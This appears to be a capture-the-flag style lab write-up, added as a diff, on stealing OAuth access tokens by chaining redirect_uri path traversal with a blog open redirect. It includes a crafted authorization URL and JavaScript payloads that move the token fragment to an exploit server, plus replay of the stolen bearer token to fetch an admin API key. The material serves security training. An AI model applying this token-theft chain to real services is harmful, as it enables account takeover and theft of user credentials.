@@ -1,0 +1,114 @@
+Lab Writeup: Stealing OAuth Access Tokens via an Open Redirect
+
+Level: Practitioner
+Category: OAuth, Open Redirect, Access Token Theft
+
+Description:
+This lab demonstrates how flawed validation of redirect URIs and a client-side open redirect can be chained to leak OAuth access tokens. The attacker’s goal is to steal the admin's access token and extract their API key via a direct API call.
+
+Objective:
+Identify an open redirect on the client application.
+
+Exploit weak redirect URI validation to redirect the access token to the exploit server.
+
+Steal the admin’s access token.
+  
+Use the token to retrieve the admin’s API key via a direct API call to /me.
+
+Submit the API key to solve the lab.
+
+Step-by-Step Walkthrough:
+1. Initial Setup and OAuth Flow Inspection
+Log in to the lab as wiener:peter.
+
+Intercept and observe the OAuth login process.
+
+Notice that after logging in, the app sends a GET /me request to retrieve user information using the access token.
+
+Send this request to Burp Repeater for later use.
+
+2. Test Redirect URI Validation
+Log out and initiate login again.
+
+From the proxy history, locate the GET /auth?client_id=... request to the OAuth server.
+
+Send it to Repeater.
+
+Modify the redirect_uri parameter with path traversal:
+
+https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1
+Send the request and observe that it is accepted and redirects to a blog post, confirming the redirect_uri is vulnerable to path traversal.
+
+3. Locate Open Redirect Endpoint
+Explore the blog and locate a "Next post" button at the bottom of blog posts.
+
+Intercept the request:
+GET /post/next?path=...
+
+Send it to Repeater.
+
+Test this by setting path=https://example.com and observe redirection to that external domain.
+
+Confirm that the endpoint is an open redirect.
+
+4. Craft the OAuth Authorization URL
+Construct a malicious URL that:
+
+Initiates OAuth login,
+
+Uses a redirect_uri pointing to the open redirect,
+
+Forwards the token to the exploit server.
+
+Format:
+
+https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=RANDOM&scope=openid%20profile%20email
+Visit this URL in a browser. You should be redirected to your exploit server and see the access token in the URL fragment.
+
+5. Create the Exploit Payload
+On the exploit server, go to /exploit and create the following JavaScript payload to extract the fragment and resend it as a query parameter (so it’s logged in the access log):
+
+
+<script>
+window.location = '/?' + document.location.hash.substr(1);
+</script>
+Store and test it. You should see a log entry such as:
+
+GET /?access_token=eyJhbGciOi...
+6. Final Exploit Delivery Script
+To automate both redirect and token exfiltration:
+
+
+<script>
+if (!document.location.hash) {
+    window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=123456&scope=openid%20profile%20email';
+} else {
+    window.location = '/?' + document.location.hash.substr(1);
+}
+</script>
+Store this final script on the exploit server.
+
+Click "Deliver exploit to victim."
+
+7. Use the Stolen Token
+Monitor the access log.
+
+Extract the access_token from the GET request.
+
+In Burp Repeater, go back to the stored /me request.
+
+Replace the Authorization: Bearer header with the stolen token.
+
+Send the request. You should receive the admin’s user info and their API key.
+
+Final Step:
+Copy the API key and paste it into the “Submit solution” form at the top of the lab page.
+
+Summary:
+Chained two flaws: directory traversal in redirect_uri and a client-side open redirect.
+
+Successfully forced the victim (admin) to initiate an OAuth login.
+
+Captured the access token using a script that reads the URL fragment.
+
+Retrieved the admin’s API key using the stolen token via a direct API call.
